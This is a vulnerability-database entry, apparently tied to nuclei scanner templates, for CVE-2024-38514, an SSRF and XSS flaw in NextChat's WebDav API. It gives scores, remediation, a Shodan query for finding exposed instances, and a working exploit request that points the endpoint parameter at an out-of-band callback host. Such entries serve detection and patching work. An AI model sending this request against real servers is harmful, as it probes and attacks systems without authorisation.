---
layout: post
cve_id: CVE-2024-38514
title: NextChat - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2024/CVE-2024-38514.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-38514.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDk
severity: high
impact: 'Unauthenticated attackers can perform SSRF attacks to access internal services,
  scan internal networks, or exfiltrate sensitive information from systems that should
  not be accessible externally.

  '
remediation: 'Upgrade to NextChat version 2.12.4 or later that includes proper validation
  of the endpoint parameter.

  '
reference:
- https://www.tenable.com/security/research/tra-2024-23
- https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/commit/dad122199a85c2f12277593973e1784b212adf5e
- https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/security/advisories/GHSA-gph5-rx77-3pjg
- https://nvd.nist.gov/vuln/detail/CVE-2024-38514
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 7.4
  cve-id: CVE-2024-38514
  cwe-id: CWE-918
  epss-score: 0.72561
  epss-percentile: 0.98716
metadata:
  verified: true
  max-request: 1
  shodan-query: title:NextChat,"ChatGPT Next Web"
tags:
- cve
- cve2024
- ssrf
- xss
- chatgpt
- nextchat
- vkev
- vuln
---

## üîç Vulnerability Description
NextChat v2.12.3 suffers from a Server-Side Request Forgery (SSRF) and Cross-Site Scripting vulnerability due to a lack of validation of the GET parameter on the WebDav API endpoint.


## üåê HTTP Request
```nohighlight
GET /api/webdav/chatgpt-next-web/backup.json?endpoint=https://webdav.yandex.com.d5iq8mple0o0ku6cca6gzqrzjcgnbses9.oast.fun/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

